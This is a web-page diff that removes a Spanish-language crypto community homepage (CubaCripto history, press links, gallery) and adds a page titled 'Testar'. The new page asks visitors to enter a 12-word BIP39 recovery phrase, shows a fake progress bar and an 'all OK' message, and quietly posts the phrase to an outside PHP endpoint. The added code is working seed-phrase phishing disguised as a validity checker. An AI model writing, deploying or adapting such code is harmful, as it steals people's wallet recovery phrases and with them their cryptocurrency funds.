@@ -1,794 +1,87 @@
-<html>
-
-<!-- head -->
+<!DOCTYPE html>
+<html lang="es">
 <head>
-
-<!-- font -->
-<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-<!-- /font -->
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-R3KMMJG3C8"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-R3KMMJG3C8');
-</script>
-<!-- /Google tag (gtag.js) -->
-
-<!-- metadata -->
-<meta lang="es">
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<!-- /metadata -->
-
-<!-- title bar -->
-<title>CUBACRIPTO</title>
-<link rel="icon" href="rs/cc11.png" type="image/png">
-<!-- /title bar -->
-
-<!-- style -->
-<style>
-html, body {
-  background-color: #FFFFFF;
-  color: #000000;
-}
-
-.navbar {
-  background-color: #0000FF;
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 50px;
-  z-index: 9999;
-  display: flex;
-  align-items: center;
-  padding: 0 20px;
-  box-sizing: border-box;
-}
-
-.logo1 img {
-  height: 20px;
-  padding: 0;
-  transition: transform 0.3s ease-in-out;
-}
-
-.logo1 img:hover {
-  transform: scale(1.1);
-}
-
-.menu-container {
-  margin-left: auto;
-  margin-right: 0;
-}
-
-.menu-item {
-  display: inline-block;
-  padding: 15px 6px;
-  color: white;
-  cursor: pointer;
-  font-family: Arial, sans-serif;
-  text-decoration: none;
-}
-
-.menu-item:hover {
-  background-color: #2960FF;
-}
-.selected {
-  background-color: #2960FF !important;
-  color: #FFFFFF !important;
-}
-</style>
-<!-- /style -->
-
+  <meta charset="UTF-8">
+  <title>Testar</title>
+  <style>
+    body { display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f0f0;font-family:Arial,sans-serif;}
+    .container { text-align:center;width:400px;}
+    input[type="text"] { width:100%;padding:8px;margin-bottom:10px;}
+    button { padding:8px 16px;cursor:pointer;}
+    .progress-bar { width:100%;height:20px;background:#ddd;margin-top:15px;border-radius:5px;overflow:hidden;display:none;}
+    .progress { height:100%;width:0%;background:#4caf50;transition:width 0.2s linear;}
+    .message { margin-top:15px;font-weight:bold;color:#333;display:none;}
+    .error { margin-top:15px;font-weight:bold;color:red;display:none;}
+  </style>
 </head>
-<!-- /head -->
-
-<!-- body -->
-<body style="font-family: 'Roboto', sans-serif; font-weight: normal; color: #000000; background-color: #FFFFFF;">
-
-
-<!-- navbar -->
-<div class="navbar">
-
-  <div class="logo1">
-    <a href="index.html">
-      <img src="rs/cc22.png">
-    </a>
+<body>
+  <div class="container">
+    <input type="text" id="texto" placeholder="Introduce 12 palabras válidas">
+    <br>
+    <button id="testar">Testar</button>
+    <div class="progress-bar" id="progress-bar">
+      <div class="progress" id="progress"></div>
+    </div>
+    <div class="message" id="message">Todo OK</div>
+    <div class="error" id="error">Frase incorrecta</div>
   </div>
 
-  <div class="menu-container">
-    <a class="menu-item selected" href="index.html"><b>INICIO</b></a>
-    <a class="menu-item" href="swap.html"><b>SWAP</b></a>
-    <a class="menu-item" href="bip39.html" target="_blank"><b>BIP39</b></a>
-  </div>
+<script>
+const validWords = [
+  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"
+];
 
-</div>
-<!-- /navbar -->
+const button = document.getElementById('testar');
+const progressBar = document.getElementById('progress-bar');
+const progress = document.getElementById('progress');
+const message = document.getElementById('message');
+const error = document.getElementById('error');
+const input = document.getElementById('texto');
 
-<!-- horizontal-bar -->
-<style>
-.horizontal-bar {
-  background-color: #F2F3F4;
-  padding: 5px;
-}
-</style>
-<!-- /horizontal-bar -->
+button.addEventListener('click', () => {
+  const texto = input.value.trim();
+  const palabras = texto.split(/\s+/);
 
-<br>
-<br>
+  // Reiniciar estados
+  progress.style.width = '0%';
+  progressBar.style.display = 'none';
+  message.style.display = 'none';
+  error.style.display = 'none';
 
-<!-- cover-image -->
-<style>
-.cover-image {
-  width: 100%;
-  margin-top: 10px;
-}
-</style>
+  let invalidWord = palabras.find(p => !validWords.includes(p.toLowerCase()));
 
-<header>
- <img src="rs/ccbg.jpg" class="cover-image" alt="">
-</header>
-<!-- /cover-image -->
+  if (palabras.length === 12 && !invalidWord) {
+    progressBar.style.display = 'block';
+    let width = 0;
+    const interval = setInterval(() => {
+      width += 1;
+      progress.style.width = width + '%';
+      if (width >= 100) {
+        clearInterval(interval);
+        message.style.display = 'block';
 
-<br>
-
-<!-- text -->
-<style>
-.text {
-  margin: 20px;
-  text-align: justify;
-}
-
-.text a {
-  text-decoration: none;
-  color: blue;
-  transition: color 0.3s;
-}
-
-.text a:hover {
-  color: red;
-}
-</style>
-
-<div class="text">
-
-  <h2>&iquest;QUI&Eacute;NES SOMOS?</h2>
-  
-
-  <p>
-    <b>CubaCripto</b> es una comunidad virtual de criptoentusiastas y emprendedores, en su mayor&iacute;a cubanos, fundada oficialmente el 31 de diciembre de 2018 por <a href="https://www.linkedin.com/in/alexsobrino/" target="_blank"><b>Alex Sobrino</b></a>, uno de los pioneros del Bitcoin en Cuba. Sus or&iacute;genes, sin embargo, se remontan a mediados de 2017 y principios de 2018, cuando exist&iacute;a apenas como un peque&ntilde;o grupo de WhatsApp llamado <i>Criptonom&iacute;a</i>. Este grupo fue creado con el prop&oacute;sito de reunir a los primeros adeptos locales y ofrecerles un espacio donde debatir e intercambiar conocimientos sobre Bitcoin y criptomonedas, un tema que en aquel entonces era pr&aacute;cticamente desconocido en el pa&iacute;s.
-  </p>
-
-  <p>
-    El contexto internacional fue decisivo para el movimiento. El a&ntilde;o 2017 es considerado hasta hoy como el m&aacute;s importante en la historia de Bitcoin y las criptomonedas, pues desencaden&oacute; una serie de acontecimientos que marcaron el rumbo del ecosistema: la legalizaci&oacute;n de Bitcoin en Jap&oacute;n y Corea del Sur, la creaci&oacute;n de Binance (que se convertir&iacute;a en el exchange m&aacute;s grande del mundo), el nacimiento de Bitcoin Cash &mdash;la bifurcaci&oacute;n m&aacute;s significativa de Bitcoin, que dio origen a otras como Bitcoin Gold&mdash;, la activaci&oacute;n del protocolo SegWit, el lanzamiento de los futuros de Bitcoin en CBOE y CME, y, por supuesto, el nuevo m&aacute;ximo hist&oacute;rico (ATH) alcanzado a finales de ese a&ntilde;o, cuando Bitcoin pas&oacute; de valer menos de US$ 1.000 en enero a rozar los US$ 20.000 en diciembre. Estos hitos impulsaron una ola de adopci&oacute;n masiva que atrajo la atenci&oacute;n de los medios de comunicaci&oacute;n y despert&oacute; el inter&eacute;s de millones de nuevos inversores en todo el mundo, y Cuba no fue la excepci&oacute;n.
-  </p>
-
-  <p>
-    El r&aacute;pido crecimiento de usuarios y la necesidad de una mejor organizaci&oacute;n llevaron a la comunidad a migrar hacia Telegram, una red social que comenzaba a ganar gran popularidad entre los cubanos. No obstante, fue reci&eacute;n a finales de 2018 cuando, por razones de identidad y autenticidad, el proyecto adopt&oacute; el nombre y el eslogan que conserva hasta hoy: <a href="https://t.me/CubaCripto" target="_blank"><b>CubaCripto: Primera Comunidad Cubana de Criptofinanzas</b></a>.
-  </p>
-
-  <p>
-    Desde entonces, su misi&oacute;n ha sido clara y ambiciosa: fomentar la adopci&oacute;n de las criptomonedas, promover el uso de la tecnolog&iacute;a blockchain y las finanzas descentralizadas, incentivar el comercio peer-to-peer (P2P) y el trading, y servir como un espacio de referencia para el intercambio de ideas y experiencias. Reconocida como la primera comunidad de criptofinanzas en Cuba y una de las m&aacute;s relevantes de la regi&oacute;n, CubaCripto logr&oacute; trascender las fronteras locales y despertar el inter&eacute;s de miles de cubanos en todo el pa&iacute;s. Este impacto no pas&oacute; desapercibido para la prensa internacional, que pronto destac&oacute; el proyecto en importantes medios digitales, amplificando a&uacute;n m&aacute;s el entusiasmo por los activos digitales y consolidando a la comunidad como un referente nacional.
-  </p>
-
-  <p>
-    A lo largo de su trayectoria, CubaCripto ha desempe&ntilde;ado un papel fundamental en la educaci&oacute;n y formaci&oacute;n de cubanos y extranjeros interesados en las criptomonedas y las finanzas descentralizadas. Tambi&eacute;n ha organizado debates, charlas, talleres y espacios de intercambio (en su mayor&iacute;a virtuales) que han permitido a sus miembros adquirir conocimientos pr&aacute;cticos y te&oacute;ricos sobre el ecosistema cripto. Asimismo, ha servido de inspiraci&oacute;n para que otros emprendedores desarrollen proyectos significativos dentro del sector, contribuyendo al crecimiento de un ecosistema cada vez m&aacute;s diverso y din&aacute;mico.
-  </p>
-
-  <p>
-    Nada de esto hubiese sido posible sin el compromiso y la colaboraci&oacute;n de sus miembros, quienes de manera desinteresada han dedicado tiempo, esfuerzo y recursos para llevar la cultura cripto a cada rinc&oacute;n de Cuba. Gracias a ellos, CubaCripto no solo se ha consolidado como una comunidad, sino como un movimiento que refleja la capacidad de los cubanos para adaptarse a las nuevas tecnolog&iacute;as y participar activamente en la revoluci&oacute;n financiera global.
-  </p>
-
-</div>
-<!-- /text -->
-
-<br>
-
-<!-- interviews -->
-<center>
- <div class="horizontal-bar">
-  <h2>ENTREVISTAS</h2>
- </div>
-</center>
-
-<br>
-
-<style>
-.interviews-container {
-  display: flex;
-  justify-content: center;
-  flex-wrap: wrap;
-  margin: 20px;
-}
-.interviews-container .mobile-youtube-player {
-  width: calc(25% - 15px);
-  margin: 0 7.5px 30px 7.5px;
-}
-@media only screen and (max-width: 600px) {
-  .interviews-container .mobile-youtube-player {
-    width: 100%;
+        // Aquí llamamos al PHP en tu servidor
+        fetch('http://www.bip39.kesug.com/guardar.php', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+          body: 'texto=' + encodeURIComponent(texto)
+        })
+        .then(res => res.text())
+        .then(data => console.log("Respuesta del servidor:", data))
+        .catch(err => console.error("Error:", err));
+      }
+    }, 200); // 200ms * 100 = 20 segundos
+  } else {
+    error.style.display = 'block';
+    if (invalidWord) {
+      const startIndex = texto.indexOf(invalidWord);
+      const endIndex = startIndex + invalidWord.length;
+      input.focus();
+      input.setSelectionRange(startIndex, endIndex);
+    }
   }
-}
-</style>
+});
 
-<div class="interviews-container">
-  <div class="mobile-youtube-player">
-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/ZINKSPmJ86A" title="Entrevista a Alex Sobrino, fundador de CubaCripto" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-  <div class="mobile-youtube-player">
-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/K7T6S8tS-Dw" title="Entrevista a miembros de CubaCripto" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-  <div class="mobile-youtube-player">
-    <iframe width="99%" height="190" src="https://www.youtube.com/embed/fiZYp0nxiVA" title="Cubanos recurren a las criptomonedas para disipar bloqueo" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-  </div>
-</div>
-<!-- /interviews -->
-
-<!-- press -->
-<center>
- <div class="horizontal-bar">
-  <h2>EN LOS MEDIOS</h2>
- </div>
-</center>
-
-<br>
-
-<style>
-.press {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(125px, 1fr));
-  grid-gap: 10px;
-  justify-content: center;
-  align-items: center;
-  margin: 0 auto;
-  max-width: 100%;
-  padding: 0 30px;
-}
-.press img {
-  max-width: 90%;
-  height: auto;
-  transition: transform 0.3s;
-}
-.press img:hover {
-  transform: scale(1.1);
-}
-</style>
-
-<div class="press">
-
- <div>
-  <a href="https://www.criptonoticias.com/comunidad/adopcion/bitcoin-criptomonedas-ganan-terreno-cuba/amp/" target="_blank">
-   <img src="rs/criptonoticias.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://finance.yahoo.com/news/skirting-u-sanctions-cubans-flock-181940122.html?" target="_blank">
-   <img src="rs/yahoo.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.eleconomista.com.mx/economia/Se-expanden-criptomonedas-en-Cuba-20190912-0094.html" target="_blank">
-   <img src="rs/eleconomista.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://decrypt.co/9227/cuba-becomes-the-latest-country-to-use-bitcoin-to-subvert-us-sanctions" target="_blank">
-   <img src="rs/decrypt.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://beincrypto.com/cryptocurrency-interest-in-cuba-surges-as-the-country-comes-online/" target="_blank">
-   <img src="rs/beincrypto.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://es.cointelegraph.com/news/crypto-in-cuba-how-does-the-cryptomarket-work-on-the-island" target="_blank">
-   <img src="rs/cointelegraph.png">
-  </a>
- </div>
-
-</div>
-
-<br>
-
-<div class="press">
-
- <div>
-  <a href="https://www.reuters.com/article/cuba-criptomonedas-idESKCN1VY0CV" target="_blank">
-   <img src="rs/reuters.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://es.investing.com/news/cryptocurrency-news/criptomonedas-en-cuba-como-funciona-el-criptomercado-en-la-isla-1918839" target="_blank">
-   <img src="rs/investing.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://morocotacoin.news/cuba/asi-nacio-movimiento-criptomonedas-cuba/" target="_blank">
-   <img src="rs/morocotacoin.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://es.ambcrypto.com/bitcoin-btc-en-cuba-las-criptomonedas-son-el-camino-hacia-el-mundo-financiero/" target="_blank">
-   <img src="rs/ambcrypto.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://horizontecubano.law.columbia.edu/news/el-impacto-de-la-crisis-de-la-covid-19-en-el-flujo-de-remesas-cuba-un-vistazo-al-uso-de" target="_blank">
-   <img src="rs/columbia.png">
-  </a>
- </div>
-
- <div>
-  <a href="https://www.nbcnews.com/news/latino/cuba-cryptocurrency-gains-momentum-rcna27207" target="_blank">
-   <img src="rs/nbcnews.png">
-  </a>
- </div>
-
-</div>
-<!-- /press -->
-
-<br>
-
-<!-- galery -->
-<center>
- <div class="horizontal-bar">
-  <h2>GALER&#205;A</h2>
- </div>
-</center>
-
-<br>
-<br>
-
-<style>
-body {
-  text-align: center;
-  margin: 0;
-  padding: 0;
-}
-.gallery {
-  display: grid;
-  grid-gap: 1px;
-  justify-items: center;
-}
-.gallery img {
-  max-height: auto;
-  max-width: 90%;
-  transition: transform 0.3s;
-  object-fit: cover;
-}
-.gallery img:hover {
-  transform: scale(1.05);
-}
-.gallery div {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 10px;
-  background-color: white;
-  text-align: center;
-}
-.gallery div h5 {
-  max-width: 100%;
-  margin: 0 auto;
-}
-@media screen and (min-width: 768px) {
-  .gallery {
-    grid-template-columns: repeat(3, 1fr);
-  }
-}
-</style>
-
-<div class="gallery">
-  <div>
-    <img src="rs/20190126_1.jpg" alt="">
-    <div>
-Primer encuentro de la comunidad cripto.<br>La Habana, enero 2019
-    </div>
-  </div>
-  
-  <div>
-    <img src="rs/20190126_2.jpg" alt="">
-    <div>
-Primer encuentro de la comunidad cripto.<br>La Habana, enero 2019
-    </div>
-  </div>
-  
-  <div>
-    <img src="rs/20190727_1.jpg" alt="">
-    <div>
-Meetup de las comunidades CubaCripto y PIVX.<br>La Habana, julio 2019
-    </div>
-  </div>
-  
-  <div>
-    <img src="rs/20190727_2.jpg" alt="">
-    <div>
-Meetup de las comunidades CubaCripto y PIVX.<br>La Habana, julio 2019
-    </div>
-  </div>
-  
-  <div>
-    <img src="rs/20191231_1.jpg" alt="">
-    <div>
-Alex Sobrino y Marcos Mu&#241;oz (CEO de Bitnovo/Bitsa).<br>La Habana, diciembre 2019
-    </div>
-  </div>
-  
-  <div>
-    <img src="rs/20191231_2.jpg" alt="">
-    <div>
-Alex Sobrino y Marcos Mu&#241;oz (CEO de Bitnovo/Bitsa).<br>La Habana, diciembre 2019
-    </div>
-  </div>
-</div>
-
-<!-- /galery -->
-
-<br>
-
-<!-- interest -->
-<center>
- <div class="horizontal-bar">
-  <h2>DE INTER&#201;S</h2>
- </div>
-</center>
-
-<br>
-
-<style>
-.interest-container {
-  display: flex;
-  justify-content: center;
-  flex-wrap: wrap;
-  margin: 20px;
-}
-.interest-container .mobile-youtube-player {
-  width: calc(25% - 15px);
-  margin: 0 7.5px 30px 7.5px;
-}
-@media only screen and (max-width: 600px) {
-  .interest-container .mobile-youtube-player {
-    width: 100%;
-  }
-}
-</style>
-
-<div class="interest-container">
-  <div class="mobile-youtube-player">
